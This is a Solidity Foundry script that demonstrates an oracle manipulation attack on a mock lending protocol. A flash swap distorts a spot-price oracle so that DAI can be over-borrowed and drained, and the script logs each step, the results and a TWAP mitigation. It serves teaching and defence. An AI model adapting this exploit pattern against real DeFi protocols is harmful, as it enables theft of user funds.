// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Script.sol";
import "forge-std/console2.sol";

import "./Deploy.s.sol";
import "../src/attackers/Attacker_Oracle.sol";
import "../src/dex/interfaces/IUniV2Pair.sol";
import "../src/oracle/OracleSpot.sol";
import "../src/MockERC20.sol";

contract DemoOracleAttack is Script {
    DeployScript public deploy;
    Attacker_Oracle public attacker;

    function run() external {
        // 1. Deploy infrastructure
        deploy = new DeployScript();
        deploy.run();

        (
            address tokenA,
            address tokenB,
            address dai,
            ,
            ,
            ,
            address pairAB,
            address oracleSpot,
            ,
            ,
            address lending,
            ,
            ,
        ) = deploy.getAddresses();

        console2.log("=== ORACLE MANIPULATION ATTACK DEMO ===");
        console2.log("tokenA:", tokenA);
        console2.log("tokenB:", tokenB);
        console2.log("DAI:", dai);
        console2.log("pairAB:", pairAB);
        console2.log("oracleSpot:", oracleSpot);
        console2.log("lending:", lending);
        console2.log("");

        // 2. Show initial state
        console2.log("=== INITIAL STATE ===");

        (uint112 r0, uint112 r1, ) = IUniV2Pair(pairAB).getReserves();
        console2.log("Pair reserve0:", uint256(r0) / 1e18);
        console2.log("Pair reserve1:", uint256(r1) / 1e18);

        uint256 priceBefore = OracleSpot(oracleSpot).getPrice(tokenA);
        console2.log("TokenA spot price before attack:", priceBefore);

        uint256 lendingDaiBefore = MockERC20(dai).balanceOf(lending);
        console2.log("Lending DAI before attack:", lendingDaiBefore / 1e18);
        console2.log("");

        // 3. Deploy attacker
        attacker = new Attacker_Oracle(
            pairAB,
            lending,
            tokenA,
            dai
        );

        console2.log("=== ATTACKER DEPLOYED ===");
        console2.log("Attacker contract:", address(attacker));
        console2.log("");

        // 4. Fund attacker
        MockERC20(tokenA).mint(address(attacker), 10000 * 1e18);

        uint256 attackerTokenABefore = MockERC20(tokenA).balanceOf(address(attacker));
        uint256 attackerDaiBefore = MockERC20(dai).balanceOf(address(attacker));

        console2.log("=== ATTACKER FUNDED ===");
        console2.log("Attacker tokenA before attack:", attackerTokenABefore / 1e18);
        console2.log("Attacker DAI before attack:", attackerDaiBefore / 1e18);
        console2.log("");

        // 5. Explain attack steps
        console2.log("=== EXECUTING ATTACK ===");
        console2.log("Step 1: Flash swap 20,000 tokenA from pair");
        console2.log("Step 2: Manipulate reserves so oracle reads wrong price");
        console2.log("Step 3: Deposit small collateral to lending");
        console2.log("Step 4: Borrow large amount of DAI");
        console2.log("Step 5: Repay flash swap");
        console2.log("Step 6: Keep borrowed DAI as profit");
        console2.log("");

        // 6. Execute attack
        try attacker.attack(20000 * 1e18, 10000 * 1e18) {
            console2.log("=== ATTACK SUCCESS ===");

            uint256 attackerDaiAfter = MockERC20(dai).balanceOf(address(attacker));
            uint256 attackerTokenAAfter = MockERC20(tokenA).balanceOf(address(attacker));
            uint256 lendingDaiAfter = MockERC20(dai).balanceOf(lending);

            (uint112 r0After, uint112 r1After, ) = IUniV2Pair(pairAB).getReserves();
            uint256 priceAfter = OracleSpot(oracleSpot).getPrice(tokenA);

            console2.log("TokenA spot price after attack:", priceAfter);
            console2.log("Pair reserve0 after:", uint256(r0After) / 1e18);
            console2.log("Pair reserve1 after:", uint256(r1After) / 1e18);

            console2.log("Attacker tokenA after attack:", attackerTokenAAfter / 1e18);
            console2.log("Attacker DAI after attack:", attackerDaiAfter / 1e18);
            console2.log("Lending DAI after attack:", lendingDaiAfter / 1e18);
            console2.log("");

            console2.log("=== ATTACK RESULT SUMMARY ===");
            console2.log("Spot price before:", priceBefore);
            console2.log("Spot price after :", priceAfter);
            console2.log("Lending DAI drained:", (lendingDaiBefore - lendingDaiAfter) / 1e18);
            console2.log("Attacker DAI profit:", attackerDaiAfter / 1e18);
            console2.log("Lending protocol is now undercollateralized!");
        } catch Error(string memory reason) {
            console2.log("=== ATTACK FAILED ===");
            console2.log("Reason:");
            console2.log(reason);
        } catch {
            console2.log("=== ATTACK FAILED ===");
            console2.log("Low-level error or panic");
        }

        console2.log("");
        console2.log("=== EXPLANATION ===");
        console2.log("This attack exploits OracleSpot, which reads price directly from current reserves.");
        console2.log("By manipulating reserves in the same transaction, attacker can:");
        console2.log("1. Distort the oracle price");
        console2.log("2. Make collateral valuation incorrect");
        console2.log("3. Borrow more than should be allowed");
        console2.log("4. Leave the lending protocol undercollateralized");
        console2.log("");
        console2.log("MITIGATION: Use TWAP oracle instead of spot price!");
    }
}